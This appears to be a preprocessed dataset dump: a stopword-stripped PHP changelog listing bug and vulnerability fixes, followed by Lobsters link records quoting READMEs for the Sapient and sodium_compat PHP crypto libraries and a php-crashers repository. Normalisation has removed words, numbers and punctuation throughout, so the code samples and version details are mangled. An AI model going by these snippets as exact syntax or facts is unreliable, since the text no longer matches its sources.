zifgraphemestripos negative offset odbc fixed bug script hang maxexecutiontime opcache fixed bug null ptr deref zendreturnspecconsthandler pdo fixed bug pdostatement implementation ignore call fixed bug quote inside comment properly handled pdodblib fixed bug dblibhandlequoter need allocate extra byte add dblibspecific attribute controlling timeouts pdopgsql fixed bug pdopgsql inefficient getcolumnmeta used postgres fixed bug pgfetchobject bind parameter call constructor fixed bug function pginsert insert column type inet soap fixed bug nested foreach assignbyreference creates broken variable spl fixed bug deserializing serialized splobjectstorageobject ca nt access property php fixed bug doublefree spldoublylinkedlist offsetset fixed bug cloned splobjectstorage overwritten gethash fails offsetexists fixed bug spl autoloader break classexists standard fixed bug arrayfill optimization break implementation fixed bug returning var twice sleep produce broken serialized data fixed bug unserialize crush restore object reference fixed bug strreplace return incorrect resulting array foreach reference fixed bug headerregistercallback registershutdownfunction fixed bug null pointer deref segfault streamcontextgetdefault fixed bug unserialize accepts wrongly data fixed bug wrong array behaviour fixed bug substrreplace bug string length fixed bug phpcrypt crash cryptr exist reentrant defined xml fixed bug xmlparseintostruct segmentation fault zip fixed bug integer overflow ziparchive getfrom version mar huge page disabled default added ability enable huge page zend memory manager environment variable fixed bug callbyreference widens scope uninvolved function used switch fixed bug possible crash zendbinstrtod zendoctstrtod zendhexstrtod fixed bug global variable reserved execution fixed bug outofbounds access phpurldecode context fixed bug string used passasreference used invoke c callable fixed bug segmentation fault zts date function setlocale fixed bug integer overflow zendmmallocheap fixed bug leaked hashtable iterators fixed bug iso c allow extra outside function fixed bug yield count eols fixed bug reflectionmethod getdoccomment return wrong comment fixed bug phpstripwhitespace fails numerical value fixed bug php r phpmodeprocessstdin broken cli server fixed bug support mkcalendar request method curl fixed bug support constant curlmaddedalready date fixed bug dateperiod getenddate segfault fileinfo fixed bug buffer overwrite finfoopen malformed magic file libxml fixed bug access violation crash phpcgiexe mbstring fixed bug addresssanitizer negativesizeparam mbflstrcut odbc fixed bug executing prepared statement succesfull first two statement pcre fixed bug segmentation fault pcre running twig test pdodblib fixed bug pdo mssql force format datetime field phar fixed bug crash bad phar filename fixed bug phardata fails open specific file fixed bug invalid memory write phar filename name phpdbg fixed crash advancing except step inside internal function session fixed bug null pointer dereference zendhashstrfindbucket snmp fixed bug phpsnmperror format string vulnerability spl fixed bug private property lost unserializing arrayobject standard fixed bug arraycolumn behaves incorrectly foreach reference fixed bug integer overflow phprawurlencode zip update bundled libzip version mar fixed bug low probability segfault zendarena fixed bug typehinted generator return tryfinally crash fixed bug forwardstaticcall crash fixed bug segfault using builtin webserver intl using symfony fixed bug integer overflow bug phpimplode fixed bug integer overflow bug phpstrtostrex fixed bug crash vm stack corruption fixed bug return typehint internal func cause fatal error throw exception fixed bug variable reference array element nt work using count fixed bug finally block executed yield fixed bug multiple heap overflow due integer overflow xmlfilterurladdcslashes cli server fixed bug builtin http server download file web bug curl fixed bug copied handle new option curlopthttpheader crash curlmultiexec fixed memory leak curlgetinfo date fixed bug call datemodify mutate timelibreltime causing datedateset issue fileinfo fixed bug finfo throw notice specific python file fpm fixed bug fpm working apache httpd balancerfcgi setup fixed bug phpfpm dumped core opcache fixed bug possible useafterfree zcg cwd zend opcache pcre fixed bug pcre segfault opcache phpdbg fixed inherited function unspecified file included phpdbggetexecutable soap fixed bug type confusion vulnerability soap makehttpsoaprequest standard fixed bug compact maintains reference fixed bug striptags improper php code parsing xmlrpc fixed bug xmlrpcencoderequest ignores encoding option zip fixed bug null pointer dereference zip extractto version feb added support new http code fixed bug exec function ignore length look null termination fixed bug check duplicate zendextension fixed bug round segfault build fixed bug null pointer deref segfault getdefinedvars via obstart fixed bug wrong interface enforced fixed bug wrong ext directory setup phpini lead crash fixed bug bad method called cloning object trait fixed bug memory leak consecutive yield fixed bug segfault zendfetchstringoffset fixed bug varexport inf print fixed bug output streamgetmetadata falsified input fixed bug wrong isref property exposed via getobjectvars fixed bug integer overflow iptcembed fix contentlength header curl fixed bug ca nt compile phpcurl statically fixed bug curlsetopt fails set curloptpostfields reference curlfile gd interbase fixed bug crash optional resource omitted ldap fixed bug ldapmodreplaceldapmodadd store value string array mbstring fixed bug mbsendmail segmentation fault openssl fixed bug opensslseal uninitialized memory usage pcre upgraded bundled pcre library phar fixed bug heap corruption tarzipphar parser fixed bug uninitialized pointer pharmakedirstream fixed bug null pointer dereference phartarsetupmetadata fixed bug stack overflow decompressing tar archive soap fixed bug crash bad soap request spl fixed bug segfault clean splautoloadfuncs autoloading fixed bug autoload function registered another activated immediately fixed bug useafterfree vulnerability spl arrayobject unserialize fixed bug useafterfree vulnerability spl splobjectstorage unserialize standard fixed bug error message contains hexadecimal instead decimal number fixed bug fileputcontents return unexpected value filesystem run full fixed bug filegetcontents ignores header context option reference fixed bug null pointer deref segfault compact via obstart fixed bug substrreplace convert integer original search array string fixed bug strreplace convert integer original search array string fixed bug range segfaults wddx fixed bug type confusion wddx packet deserialization version jan fixed bug nt work fixed bug segmentation fault cleanupunfinishedcalls fixed bug zendmodconflicts xdebug nt work fixed bug segmentation fault return type hinting fixed bug memleak headerregistercallback fixed bug local object class method stay memory call fixed bug configure fails test fixed bug extension test fail dynamic ext dependency fixed bug check duplicate zendextension fixed bug invalid numeric literal parse error within highlightstring function fixed bug incorrect ht iterator invalidation cause iterator reuse fixed bug negating zero produce negative zero fixed bug varexport export float integer fixed bug unary add negative zero produce positive zero curl fixed bug sementation fault using curl zts dba fixed key leak invalid resource filter fixed bug filterinput inputenv work ftp implemented fr option ignore returned ftp pasv address fpm fixed bug fpmlogc memory leak buffer overflow gd fixed bug memory read via gdimagerotateinterpolated array index bound mbstring fixed bug mbsendmail program terminated signal sigsegv segmentation fault opcache fixed bug define autoprependfile overwrite pcre fixed bug pregreplace array creates replace array already set readline fixed bug readlinecompletionfunction corrupts static array second tab session fixed bug session gc may remove obsolete session data spl fixed bug reflectionmethod arrayobject constructor return wrong number parameter fixed bug performance degradation arrayiterator large array standard fixed bug heap bufferover flow escapeshell function wddx fixed bug use free vulnerability wddx packet deserialization fixed bug session wddx packet deserialization type confusion vulnerability xmlrpc fixed bug type confusion vulnerability phptoxmlrpcworker version dec fixed bug format string vulnerability class name error message fixed bug compile fails system cpu fixed bug symbol referencing error sparcsolaris fixed bug using parentclass instead parent static context changed fixed bug segfault combining error handler output buffering fixed bug weird error handling tostring error thrown fixed bug invalid opcode using class trait method paramater default value fixed bug try finally create infinite chain exception fixed bug two error message conflict fixed bug yield incorrectly mark valid generator finished fixed bug buildconf failure extension fixed bug sapi build problem aix undefined symbol phpregisterinternalextensions fixed int generally every scalar type name leading backslash accepted type name fixed exception thrown immediately generator yielding array fixed bug static class within closure call cause segfault fixed bug incorrect exception handler yield fixed double free error condition format printer cli server fixed bug segfault phpcliserverdispatchrouter intl fixed bug use free collator sortwithsortkeys mysqlnd fixed bug load data local infile openbasedir restriction fixed bug mysqli provide way disable peer certificate validation introducing mysqliclientssldontverifyservercert connection flag fixed lob implementation sizetzendlong mismatch reported gcov opcache fixed bug unable use php sidebyside php server fixed bug error array type incomplete element type fixed bug segmentation fault pdofirebird fixed bug integer returned integer phpdbg fixed stderr written stdout reflection fixed bug reflectionproperty setvalue behavior changed fixed bug setstaticpropertyvalue behavior inconsistently soap fixed bug array key reference break argument processing spl fixed bug undefined index arrayiterator fixed bug execute release bound parameter instead internal buffer standard fixed bug phprandombytes called object function fixed bug reflectionfunction arrayunique return wrong number parameter streamssocket add constant make usable stream context version dec fixed bug ini parser segfault iniscannertyped fixed bug zendthroworerror format string vulnerability fixed bug null ptr dereference instantiating class invalid array property fixed bug null ptr deref segfault crafted calable fixed bug segmentation fault running phpunit test phpbb fixed bug segmentation fault whilst running drupal test suite fixed bug persistent stream segmentation fault fixed bug several function check return code phpstreamcopytomem fixed bug incorect logic incrementfunction proxy object fixed bug regression zendfetchdebugbacktrace cause segfaults fixed bug regression private static property access fixed bug segfault inilex zendzendiniscannerl fixed bug exception handler work expected fixed bug stack buffer overflow zendlanguageparser fixed bug null ptr deref segfault zendgetclassfetchtype fixed bug infinite loop due exception identical comparison fixed bug closure callbind crash reflectionfunction getclosure fixed bug duplicate array key via undefined index error handler fixed bug segfault binding internal instance method null fixed bug segfault getclosure internal method rebind invalid added zendinternalfunctionreserved field fixed bug memleak return type verifying failed fixed bug fungetarg unsetted var return unknow fixed bug redundant information printed case uncaught engine exception fixed bug unsetting function variable corrupts backtrace fixed bug assert instanceof add apostrophe around class name fixed bug memory leak autoglobalcopyctor zts build fixed bug memory leak phpinic fixed bug longer work fixed bug sigsegv segmentation fault zendastdestroyex fixed bug wrong behavior returning reference object fixed bug syntactical inconsistency new group use syntax fixed bug magic getter break reference array property fixed bug notice unserialize unexpected end serialized data fixed bug field incorrectly parsed header fixed bug bundled nt handle freebsd building extension fixed bug causing exception trace anon class truncated fixed bug segmentation fault using closure call yield fixed bug memleak assigning object offsetget result fixed bug apache crash related zendsendref fixed bug accessing array crash php fixed bug segfault doresize fails allocated memory fixed bug segfault efree fixed bug segfault unset var fixed bug incrementing value returned magic getter fixed bug segfault invoke static fixed bug finally broken opcache fixed bug zvalcopyvalueex broken solaris sparc fixed bug sapi may truncate post data fixed bug checking liveness work expected fixed bug skipped assertion affect generator return fixed bug creating huge array nt result exhausted segfault fixed finally issue fixed bug real memory usage nt decrease fixed bug class lost closure fixed bug segfault zendfindaliasname fixed bug null ptr deref seg fault zendhandleexception fixed bug unexpected return type error fixed bug inheritance anonymous class fixed bug sigsegv fixed bug compilerhaltoffset namespace defined fixed bug sometimes empty server querystring fixed bug refcount issue fixed bug asm operand impossible constraint fixed bug null pointer deref segfault zendevalconstexpr fixed bug segfault zendassigndivspeccvunusedhandler fixed bug remotely triggerable stack exhaustion via recursive method call fixed bug different array compare indentical due integer key truncation fixed bug unserialize could lead unexpected method execution null pointer deref fixed bug segfault zendfetchdimwspecvarconsthandler fixed bug build failure mac o x recursive inlining fixed bug exception lost nested finally block fixed bug changing property cloned object affect original fixed bug use free assign ref overloaded object fixed bug cli function default arg stdout crash output fixed bug segfault gccollectcycles improved zendstring api fixed bug segfault trying combine assignop arrayaccess object fixed bug different way handling divmodintdiv fixed bug long timeout pipe fixed bug uninitialised value strtr array fixed bug invalid read size zendcompileshortcircuiting fixed bug broken output apacherequestheaders fixed bug iconvsubstr nt work fixed bug php segmentation fault exactly extension loaded fixed bug null ptr deref seg fault zendresolveclassname fixed bug reflection closure invoke borks type hint class name fixed bug serialization anonymous class prevented fixed bug parseinifile parseinistring segmentation fault fixed bug phpinfo report professional edition window business fixed bug phpinfo report many window skus fixed bug null coalesce operator nt work string offset fixed bug unexpected array comparison result fixed bug different array compare indentical due integer key truncation fixed bug strict comparison integer empty string key crash fixed bug default parameter value wrong type segfaults fixed bug fatal error nesting level deep recursive dependency fixed bug item added array removed arraypopshift fixed bug add support callable sytnax class method fixed bug double free zendlistdtor fixed bug segfault magic method call private method superclass improved call callstatic magic method handling called stackless way using zendcalltrampoline opcode without additional stack frame optimized string concatenation fixed weird operator behavior division zero emits warning return inf modulo zero intdid throw exception shift negative offset throw exception compiletime evaluation division zero disabled fixed bug hash table collision lead inaccessible array key fixed bug invalid read size zendstdreadproperty fixed bug segfault zendzendhashc function zendhashdelel fixed bug closure executed via static autoload incorrectly marked static fixed bug access static class lambda writen outside class fixed bug call private function closure failed added phpintmin constant added closure call method fixed bug segfault calling phpversion spl implemented rfc catchable call member function bar nonobject added option parameter unserialize allowing specify acceptable class http wikiphpnetrfcsecureunserialize fixed bug garbage collector free zvals still referenced removed zendaccfinalclass promoting zendaccfinal final class modifier islong isinteger alias isint implemented fr phpinfo php variable single quote added operator added operator added u xxxxx unicode codepoint escape syntax fixed oversight define support array yet const syntax use integer float instead long double zpp type hint conversion error message implemented fr erecoverableerror output buffering output buffering handler removed scoped call nonstatic method incompatible context removed support style comment ini file removed support assigning result new reference invalid octal literal source code produce compile error fix phpsadness removed dl function fpmfcgi removed support hexadecimal numeric string removed obsolete extension sapis see full list upgrading added null byte protection exec system passthru added errorclearlast function fixed bug number converted incorrectly improved zendqsort using hybrid sorting algo better performance also renamed zendqsort zendsort added stable sorting algo zendinsertsort improved zendmemnchr using sunday algo better performance implemented rfc scalar type decalarations implemented rfc group use declaration implemented rfc continue output buffering implemented rfc constructor behaviour internal class implemented rfc fix foreach behavior implemented rfc generator delegation implemented rfc anonymous class support implemented rfc context sensitive lexer fixed bug offbyone buffer overflow phpsysreadlink cli server fixed bug url fixed bug set httpcontenttype contenttype fixed bug cli server directory traversal fixed bug php change mkcalendar request method mkcol fixed bug response return contenttype header refactor mime type handling use hash table instead linear search update mime type list one shipped apache httpd added support search webdav method com fixed bug casting object bool return false curl fixed bug segmentation fault multiple curlcopyhandle fixed bug curlsetoptarray type confusion fixed bug curlgetinfo return corrupted value fixed bug segmentation fault curlgetinfo fixed bug segfault curlmultiexec removed support unsafe file uploads date fixed bug strtotime emit warning parameter object string fixed bug dateinterval constructintervalspec supposed optional fixed bug new datetimezone foo ignoring text null byte fixed dayofweek function could sometimes return negative value internally removed isdst parameter mktime gmmktime removed datetimezone warning http wikiphpnetrfcdatetimezonewarningremoval added v datetime format modifier get version fraction second implemented fr added datetime output extended format includes fraction second dba fixed bug dbadelete return true missing item inifile fixed bug useless comparison dom fixed bug could nt fetch error domdocument registernodeclass fixed bug assigning domnode textcontent additional entity encoding fixed bug segmenation fault access violation iterating domnodelist made domnode textcontent writeable exif fixed bug buffer overread exifreaddata tiff ifd tag byte value byte fileinfo fixed bug libmagic nt assume char signed filter new filtervalidatedomain better rfc conformance filtervalidateurl fixed bug wrong return value filtervalidateboolean filternullonfailure fpm fixed bug phpfpm crash fixed bug http authorization header sometimes passed newer reqeusts fixed bug unknown admin value segfault pool fixed bug specify config line longer byte implemented fr split main fpm config ftp fixed bug ftp support window gd fixed bug imagerectangle problem point ordering fixed bug stack overflow imagefilltoborder fixed bug imagecreatefromwebm shift color fixed bug imagewebp nt pad even length fixed bug imagerotate degree truncates image fixed bug imagescale imgbicubic leak memory fixed bug imagescale segfault palette based image fixed bug zeroheight rectangle whisker fixed bug imagecrop add black line cropping fixed bug copy n paste error fixed bug php segfaults imagexbm fixed bug gdinfo nt report webp support replace libvpx libwebp bundled libgd fixed bug imagegammacorrect function loses alpha channel made fontfetch path parser threadsafe removed support gmp fixed bug use free vulnerability unserialize gmp hash fixed bug haval give wrong hash specific case imap fixed bug building static imap fails fixed bug curl multi leaking memory intl fixed bug intlchar foldcase incorrect argument missing constant fixed bug intlchar fordigit second parameter optional removed deprecated alias datefmtsettimezoneid intldateformatter settimezoneid json fixed bug jsondecode produce invalid bytesequences fixed bug jsondecode fatal error access property started replace nonfree json parser parser jsond extension fix json extension includes problematic license statement fixed bug jsondecode decodes empty string without error ldap fixed bug implement ldapoptdiagnosticmessage litespeed updated litespeed sapi code libxml fixed handling big line error message libxml mcrypt fixed bug mcryptencrypt wo nt return data iv specified fixed bug mcrypt fd caching working fixed possible read end buffer use free removed mcryptgenericend alias removed mcryptecb mcryptcbc mcryptcfb mcryptofb mysqli fixed bug constructor mysqli wrong name mysqlnd fixed bug sql result set null cause fatal memory error fixed bug mysqlirealquery unknown type sent server fixed bug mysqlnd nt activate tcp keepalive connecting server fixed bug segfault mysqlndconnect fixed bug mysqlistmt fetch nt assign null value bound variable fixed memory leak lob fixed bug oci int overflow corrected hash destructors prevent segfaults fix odbc fixed bug php segfaults accessing nvarchar max defined column opcache fixed bug require statement broken opcachereset hour use fixed bug segmentation fault macosx fixed bug undefined symbol opcacheso mac o x fixed compatibility window see also bug attmpt fix unable reattach base address problem fixed bug warning internal error wrong size calculation fixed bug empty dowhile segmentation fault opcode cli enabled fixed bug segfault function us explicit return type explicit cast fixed bug build fails building fixed bug crash opcache using removed opcacheloadcomments configuration directive doc comment loading cost nothing always enabled fixed bug wrong size calculation function table fixed bug segfault eval opcache fast shutdown added experimental disabled default file based opcode cache fixed bug try block removed extendedinfo opcode generation turned fixed bug strlen incorrect mbstring opcache openssl require least openssl version fixed bug lookup opensslcnf cause message box fixed bug openssl extension get dh parameter dh key resource fixed bug missing arginfo opensslseal fixed bug opensslseal fails aes implemented fr add iv parameter opensslseal opensslopen fixed bug opensslrandompseudobytes cryptographically secure fixed bug openssl error key value mismatch extra cert added alpnprotocols ssl context option allowing encrypted clientserver stream negotiate alternative protocol using alpn tl extension built openssl newer negotiated protocol information accessible streamgetmetadata output removed cnmatch sniservername ssl context option use automatic detection peername option instead pcntl fixed bug ca nt compile netbsd missing wcontinued wifcontinued fixed bug pcntlsignal nt decrease refcount old handler setting sigdfl implemented fr added wifcontinued wcontinued added rusage support pcntlwait pcntlwaitpid pcre fixed bug incorrect bumpalong behavior k empty string match fixed bug multiple vulnerability related pcre function fixed bug incorrect bumpalong behavior k empty string match fixed bug pregreplace qualifier unicode replace garbles string fixed bug segfault pregreplacecallback removed support e pregreplaceeval modifier pdo fixed bug segmentation fault pdoparseparams drupal test suite fixed bug pdo constructor change unrelated variable fixed bug segfault pdomysql fixed bug persistent sqlite connection custom function segfaults fixed bug configure fails find phppdodriverh pdodblib fixed bug segmentation fault nextrowset pdomysql fixed bug add new pdo mysql connection attr control multi statement option pdooci fixed bug pdo attrprefetch ignored pdopgsql fixed bug pdostatement execute leak memory dml statement closecuror u removed pgsqlattrdisablenativepreparedstatement attribute favor attremulateprepares phar fixed bug null pointer dereference phargetfpoffset fixed bug uninitialized pointer pharmakedirstream zip entry filename improved fix bug fixed bug file extracted archive may placed outside destination directory phpdbg fixed bug incorrect exit code rr mode exception fixed bug phpdbg must respect setexceptionhandler fixed bug run quit mode qrr fallback interactive mode fixed bug help overview h rpint anything window fixed bug php wo nt compile missing constant fixed bug fasync defined need sysfileh include fixed bug segfault displaying memory leak reflection fixed bug wrong docblock assignment fixed bug reflectionfunction getclosure leak memory used internal function fixed bug causing bogus trace reflectiongenerator gettrace fixed inheritance chain reflector interface added reflectiongenerator class added reflection support return type type declaration session fixed bug segmentation fault regenerating session id strict mode fixed bug session read cause string zeroterminated error fixed bug reference session lost call sessionregenerateid fixed bug data integrity issue accessing superglobals reference fixed bug regression sessionregenerateid fixed bug modfilessh bashscript soap fixed bug segfault soap typetostring fixed bug soapclient systematic memory error fixed bug segmentation fault wsdl targetnamespace attribute fixed bug segmentation fault inside soap client fixed bug soap client generates segfault fixed bug soap serializefunctioncall type confusion rce fixed bug soapclient info leak null pointer dereference via multiple type confusion fixed bug segmentation fault soapclient call fixed bug makehttpsoaprequest call zendhashgetcurrentkeyex null fixed bug segmentation fault soapclient gettypes spl fixed bug arrayobject unserialize restore protected field fixed bug splfixedarray throw exception using ref variable index fixed bug pcre jit pattern reuse segfault fixed bug incorrect arrayobject serialization unset called serialize fixed bug cloning splpriorityqueue lead memory leak fixed bug incorrect constructor reflection arrayobject fixed bug dangling pointer unserialization arrayobject item fixed bug use free vulnerability unserialize splarrayobject fixed bug use free vulnerability unserialize splobjectstorage fixed bug use free vulnerability unserialize spldoublylinkedlist fixed bug mutlitpleiterator arraykeys incompatible change php fixed bug useafterfree vulnerability splrecursiveitmoveforwardex fixed bug arrayobject arrayasprops broken changed arrayiterator implementation using zendhashiterator api allowed modification iterated arrayobject using behavior proposed fix foreach behavior removed array modified outside object internal position longer valid hack implemented fr splpriorityqueuesplheap nt expose extractflags curruption state fixed bug recursivedirectoryiterator currentaspathname break recursiveiterator fixed bug memory leak fixed bug useafterfree vulnerability fixed bug segfault manually constructing fixed bug fetcharray declares wrong requirednumargs standard fixed count symbol table fixed bug unserialize show unknown result fixed bug extract break variable reference fixed bug arraymergerecursive corrupts memory unset item fixed bug strtr cause invalid writes crash fixed bug arraykeys nt respect reference strict true implemented rfc random function throwing exception php fixed bug pack x produce error fixed bug changing configuration ignoreuserabort true nt working fixed bug segmentation fault setrawcookie fixed bug setcookie conditional empty value met fixed bug useafterfree vulnerability unserialize splobjectstorage fixed bug useafterfree vulnerability unserialize spldoublylinkedlist fixed bug extract turn array element reference fixed bug php zendhashiffulldoresize use free fixed bug assert breaking access object fixed bug strireplacephpstringtolower arbitrary code execution implemented fr allow dirname go various time fixed bug scandir duplicate file name every file fixed bug repeated iptcembed add superfluous ff byte fixed bug exec strip whitespace fixed bug getbrowser fails user agent null fixed bug unable parse url colon char fixed bug escapeshell nt cater fixed bug truncating entire string result string fixed bug passing parameter reference arraycolumn fixed bug cookie name empty fixed bug phpcopyfileex pas argument fixed bug regression arrayfilter flag argument php removed callusermethod callusermethodarray function fixed user session handler see rfc sessionuserreturnvalue added intdiv function improved precision log function base remove string category support setlocale remove setmagicquotesruntime alias magicquotesruntime fixed bug flock parameter set correctly window added pregreplacecallbackarray function deprecated salt option passwordhash fixed bug passwordverify report back error null string added window support getrusage removed hardcoded limit number pipe procopen stream fixed bug http stream wrapper nt close keepalive connection fixed bug omits padding byte removed setsocketblocking favor alias streamsetblocking tokenizer fixed bug tokengetall new irrecoverable error xmlreader fixed bug xmlreader read generates extra output xmlrpc fixed bug xmlrpcsettype return false success xsl fixed bug return true false expected fixed bug xslt free invalid pointer fixed bug null pointer dereference fixed bug xslt extension thread safe removed xslsecurityprefs ini option zlib added deflateinit deflateadd inflateinit inflateadd function allowing incrementalstreaming compressiondecompression zip fixed bug ziparchive close nt indicate error fixed bug ziparchive extractto allows directory traversal creating directory added ziparchive setcompressionname ziparchive setcompressionindex method update bundled libzip fixed bug ziparchive getstream return null certain file
158,Lobsters,php,PHP programming,Sapient – Security Toolkit for HTTP-Based APIs,https://github.com/paragonie/sapient,sapient security toolkit httpbased apis,sapient secure api toolkit sapient requires php newer php security cryptography team paragon initiative enterprise blog post using sapient harden phppowered apis sodiumcompat encrypts authenticates message body feature glance unit test phpunit automated static analysis psalm sapient adapter documentation sapient language example signed response serverside signing http response clientside verifying signature example mutually signed json api guzzle adapter clientside sending signed request verifying response serverside verifying signed request signing response,sapient secure api toolkit sapient secures php application servertoserver http traffic even wake tl security breakdown compromised certificate authority etc sapient allows quickly easily add applicationlayer cryptography api request response requires php newer sapient designed implemented php security cryptography team paragon initiative enterprise see blog post using sapient harden phppowered apis information design rationale motivation cryptography provided sodiumcompat turn use libsodium extension pecl installed sodiumcompat operates string rather resource aka stream sapient suitable extremely large message system low available memory sapient encrypts authenticates message body need header encrypted authenticated job transportlayer security tl feature glance work request response object includes guzzle adapter http client secure apis sharedkey encryption sharedkey authentication anonymous publickey encryption publickey digital signature work array ie method json name sendsreceives signed encrypted json work string ie method without json name digital signature authentication backwardscompatible unsigned json api client server signaure authentication tag go http header rather requestresponse body additionally sapient covered unit test provided phpunit automated static analysis provided psalm sapient adapter looking integrate sapient existing framework framework correctly implement likely need adapter however adapter provide convenience method make rapid development easier learn adapter see documentation adapterinterface sapient language example signed response demonstrats minimal implementation add signature existing http response serverside signing http response php use use paragoniesapientsapient use paragoniesapientcryptographykeyssigningsecretkey use psrhttpmessageresponseinterface var responseinterface response let assume valid responseinterface object already likely normal framework thing sapient new sapient serversignsecret new signingsecretkey decode signedresponse sapient signresponse response serversignsecret clientside verifying signature php use use paragoniesapientsapient use paragoniesapientcryptographykeyssigningpublickey use paragoniesapientexception headermissingexception invalidmessageexception use psrhttpmessageresponseinterface var responseinterface response let assume valid responseinterface object already likely result http request server sapient new sapient serverpublickey new signingpublickey decode try verified sapient verifysignedresponse response serverpublickey catch headermissingexception ex server nt provide header discard log error catch invalidmessageexception ex invalid signature message discard log error example mutually signed json api guzzle adapter example take advantage adapter provides convenience method described convenienceinterface clientside sending signed request verifying response php use guzzlehttpclient use use paragoniesapientadapterguzzle guzzleadapter use paragoniesapientsapient use paragoniesapientcryptographykeyssigningpublickey use paragoniesapientcryptographykeyssigningsecretkey use paragoniesapientexceptioninvalidmessageexception http new client baseuri http yourapiexamplecom sapient new sapient new guzzleadapter http key clientsigningkey new signingsecretkey decode serverpublickey new signingpublickey decode use array define message mymessage date new datetime format datetime atom body test hello world create signed request request sapient createsignedjsonrequest post myapiendpoint mymessage clientsigningkey response http send request try var array verifiedresponse verifiedresponse sapient decodesignedjsonresponse response serverpublickey catch invalidmessageexception ex httpresponsecode exit serverside verifying signed request signing response php use guzzlehttpclient use use use paragoniesapientadapterguzzle guzzleadapter use paragoniesapientsapient use paragoniesapientcryptographykeyssigningpublickey use paragoniesapientcryptographykeyssigningsecretkey use paragoniesapientexceptioninvalidmessageexception http new client baseuri http yourapiexamplecom sapient new sapient new guzzleadapter http clientpublickey new signingpublickey decode request serverrequest fromglobals try var array decodedrequest decodedrequest sapient decodesignedjsonrequest request clientpublickey catch invalidmessageexception ex httpresponsecode exit business logic go signing response serversignsecret new signingsecretkey decode responsemessage date new datetime format datetime atom body status ok message got message loud clear response sapient createsignedjsonresponse responsemessage serversignsecret framework speaks return response object let take care rest
159,Lobsters,php,PHP programming,PHP crashers,https://github.com/hannob/php-crashers,php crasher,phpcrashers description link,phpcrashers example script cause segfaults php description php memory safe language garbage collector thus usually nt crash unless bug however analyzing php service crash occasionally found situation php crashed php developer nt consider worth fixing collect link
160,Lobsters,php,PHP programming,sodium_compat: pure-PHP implementation of (most of) libsodium,https://github.com/paragonie/sodium_compat,sodiumcompat purephp implementation libsodium,sodium compat available pecl noneol version php important joomla magento installing sodium compat install source release tarball gnupg public key php archive phar release sodiumcompat release support commercial support libsodium contact paragon initiative enterprise github issue support contract purchasing support contract paragon initiative enterprise using sodium compat true polyfill standard extsodium api feature asis generaluse polyfill php polyfill second vote libsodium rfc help sodiumcompat slow make fast install libsodium php extension pecl processor using actually implement constanttime multiplication tell sodiumcompat slow runtime help php integer super slow php window documentation libsodium quick reference official libsodium documentation api coverage recommended reading libsodium quick reference cryptography primitive provided feature excluded polyfill phpcompatibility ruleset github packagist,sodium compat sodium compat pure php polyfill sodium cryptography library libsodium core extension php otherwise available pecl library tentativeley support php latest officially support noneol version php php extension installed sodium compat opportunistically transparently use php extension instead implementation important cryptography library formally audited independent third party specializes cryptography cryptanalysis require audit use sodiumcompat project fund audit please open issue contact security paragonie dot com help get ball rolling however sodiumcompat adopted high profile open source project joomla magento furthermore sodiumcompat developed paragon initiative enterprise company specializes secure php development php cryptography informally reviewed many security expert also specialize php like learn defensive security measure taken prevent sodiumcompat source vulnerability system please read cryptographically secure php development installing sodium compat using composer composer require paragoniesodiumcompat install source using composer download release tarball signed gnupg public key extract content include autoloadphp script project php requireonce pathtosodiumcompatautoloadphp php archive phar release since version sodiumcompat release include php archive phar file associated gpg signature first download file verify gpg public key like getting public key keyserver gpg fingerprint ne echo e pgp public key gpg keyserver pgpmitedu recvkeys security security paragoniecom gpg fingerprint ne echo e download pgp public key exit fi fi verifying php archive gpg verify sodiumcompatpharsig sodiumcompatphar simply include phar file application php requireonce pathtosodiumcompatphar support commercial support libsodium available multiple vendor need help using sodiumcompat one project contact paragon initiative enterprise noncommercial report facilitated github issue offer guarantee availability resolve question integrating sodiumcompat thirdparty software free strive fix bug securityrelated otherwise library support contract company us library product service may interested purchasing support contract paragon initiative enterprise using sodium compat true polyfill using php newer pecl extension installed use standard extsodium api feature asis polyfill work magic php requireonce pathtosodiumcompatautoloadphp alicekp sodiumcryptosignkeypair alicesk sodiumcryptosignsecretkey alicekp alicepk sodiumcryptosignpublickey alicekp message test message signature sodiumcryptosigndetached message alicesk sodiumcryptosignverifydetached signature message alicepk echo ok phpeol else throw new exception invalid signature polyfill expose api php php extension installed already generaluse polyfill user php want write code work whether pecl extension available want use paragoniesodiumcompat class libsodium need example written general use php requireonce pathtosodiumcompatautoloadphp alicekp paragoniesodiumcompat cryptosignkeypair alicesk paragoniesodiumcompat cryptosignsecretkey alicekp alicepk paragoniesodiumcompat cryptosignpublickey alicekp message test message signature paragoniesodiumcompat cryptosigndetached message alicesk paragoniesodiumcompat cryptosignverifydetached signature message alicepk echo ok phpeol else throw new exception invalid signature generally replace sodium paragoniesodiumcompat code already written libsodium php extension work polyfill without additional code change since nt require namespace api exposed php since version namespaced api paragoniesodium allow brevity software us php useful want use file cryptography feature without writing paragoniesodiumfile every time exposed php project support php use underscore method instead learn use libsodium read using libsodium php project php polyfill per second vote libsodium rfc php us sodium instead sodium php requireonce pathtosodiumcompatautoloadphp alicekp sodiumcryptosignkeypair alicesk sodiumcryptosignsecretkey alicekp alicepk sodiumcryptosignpublickey alicekp message test message signature sodiumcryptosigndetached message alicesk sodiumcryptosignverifydetached signature message alicepk echo ok phpeol else throw new exception invalid signature help sodiumcompat slow make fast three way make fast use php install libsodium php extension pecl previous two option available verify processor using actually implement constanttime multiplication sodiumcompat must trade speed order attain crossplatform security certain processor safe set paragoniesodiumcompat fastmult true without harming security cryptography key processor nt safe decide whether want speed security ca nt tell sodiumcompat slow runtime since version use polyfillisfast static method determine sodiumcompat slow runtime php paragoniesodiumcompat polyfillisfast use libsodium process execute else defer cron job sort asynchronous process process enqueue help php integer super slow feature sodiumcompat incredibly slow php window particular publickey cryptography encryption signature affected nothing due platform restriction integer acceptable performance highly recommend window user version libsodium extension pecl alternatively simply upgrade php slowdown greatly reduced also true nonwindows operating system somehow php compiled phpintsize equal instead ie linux documentation first want read libsodium quick reference aim answer function use common problem nt find answer quick reference page check using libsodium php project finally official libsodium documentation written c library php library also contains lot insightful technical information may find helpful api coverage recommended reading libsodium quick reference mainline nacl feature cryptoauth cryptoauthverify cryptobox cryptoboxopen cryptoscalarmult cryptosecretbox cryptosecretboxopen cryptosign cryptosignopen pecl libsodium feature cryptoboxseal cryptoboxsealopen cryptogenerichash cryptogenerichashinit cryptogenerichashupdate cryptogenerichashfinal cryptokx cryptoshorthash cryptosigndetached cryptosignverifydetached advanced user cryptostream cryptostreamxor utility eg crypto keypair add cryptokdfderivefromkey cryptokxclientsessionkeys cryptokxserversessionkeys pad unpad cryptography primitive provided elliptic curve diffie 